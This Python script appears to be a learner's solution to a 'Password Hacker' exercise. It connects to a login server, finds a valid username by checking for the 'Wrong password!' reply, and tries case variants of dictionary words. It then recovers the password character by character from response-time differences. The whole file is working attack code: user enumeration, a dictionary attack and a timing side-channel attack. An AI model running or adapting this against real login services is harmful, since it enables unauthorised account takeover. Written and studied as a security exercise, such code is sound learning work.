# write your code here
import socket
import sys
import itertools
import json
from datetime import datetime


# generates a paswords for every combinatin of a number and letter
from idlelib.configdialog import is_int


def generate_password():
    numbers = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
    letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
               'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    num_letters = numbers + letters
    length = 1
    while True:
        my_iter = itertools.combinations(num_letters, length)
        length += 1
        for passw in my_iter:
            yield ''.join(passw)


def load_from_file(path):
    arr = list()
    with open(path, 'r') as f:
        for line in f:
            arr.append(line.strip())
    return arr


# generates a password for every combination of
# lower and upper case letters form the dictionary
# of typical passwords
def dict_crack(passwords):
    for pswd in passwords:
        if is_int(pswd) and pswd.isdigit():
            yield pswd
            continue
        password = list(pswd)
        indexes = range(len(password))
        length = 1
        while length < len(password):
            my_iter = itertools.combinations(indexes, length)
            length += 1
            for indx in my_iter:
                new_password = list(pswd)
                for idx_p, val in enumerate(password):
                    if idx_p in indx:
                        new_password[idx_p] = val.upper()

                yield ''.join(new_password)


list_of_logins = load_from_file("/Users/andreea.moraru/Documents/projects/Password Hacker/"
                                "Password Hacker/task/hacking/logins.txt")
list_of_passwords = load_from_file("/Users/andreea.moraru/Documents/projects/Password"
                                   " Hacker/Password Hacker/task/hacking/passwords.txt")

filtered_list = list()
response = ''

wrong_pass = {
    'result': 'Wrong password!'
}

exception_message = {
    'result': 'Exception happened during login'
}

win_mess = {
    'result': 'Connection success!'
}

login = ''
password_found = ''
final_password = ''
# creating the socket
client_socket = socket.socket()

hostname = sys.argv[1]
port = int(sys.argv[2])
address = (hostname, port)

# connecting to the server
client_socket.connect(address)

# try to find the login
# with empty password
for guess_login in list_of_logins:
    data = {
        "login": guess_login,
        "password": " "
    }

    json_str = json.dumps(data)
    # print(json_str)
    # converting to bytes
    message = json_str.encode()

    # sending through socket
    client_socket.send(message)

    # receiving the response
    response = client_socket.recv(1024)

    # decoding from bytes to string
    response = response.decode()

    json_response = json.loads(response)

    # if login is right you get the ‘wrong password’
    if json_response == wrong_pass:
        # print("Finish finding logIn the login is:  ", guess_login)
        login = guess_login
        break

if login == '':
    for guess_login in dict_crack(list_of_logins):
        data = {
            "login": guess_login,
            "password": " "
        }

        json_str = json.dumps(data)
        # print(json_str)
        # converting to bytes
        message = json_str.encode()

        # sending through socket
        client_socket.send(message)

        # receiving the response
        response = client_socket.recv(1024)

        # decoding from bytes to string
        response = response.decode()

        json_response = json.loads(response)
        # print(json_response)
        # if login is right you get the ‘wrong password’
        if json_response == wrong_pass:
            # print("Finish finding logIn the login is:  ", guess_login)
            login = guess_login
            break

# now try password of lenght 1

one_length = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", 'a', 'b', 'c',
              'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
              'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
              'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S',
              'T', 'U', 'V', 'W', 'X', 'Y', 'Z']

for i in range(20):
    for ch in one_length:
        psw = password_found + ch
        data = {'login': login, 'password': psw}
        json_str = json.dumps(data)
        # print( data)
        # converting to bytes
        message = json_str.encode()
        start = datetime.now()

        # sending through socket
        client_socket.send(message)

        # receiving the response
        response = client_socket.recv(1024)

        finish = datetime.now()

        # decoding from bytes to string
        response = response.decode()

        json_response = json.loads(response)
        # print(json_response)

        difference = (finish - start).total_seconds()
        # print(difference)
        # 0.002577 0.102001 0.001897 0.002455

        # ‘exception’  if the letter match the fist letter of password
        if difference >= 0.00955:
            password_found += ch
            # print("Found the next letter of the password:", password_found)
            break
        if json_response == win_mess:
            # print('the password ', password_found)
            password_found += ch
            final_password = password_found
            # print("THe password is found")
            # print(password_found)
            client_socket.close()
            break
    if json.loads(response) == win_mess:
        break
# if success message then stop


answer = json.dumps({
    'login': login, 'password': password_found
})
print(answer)

# close in the end
client_socket.close()
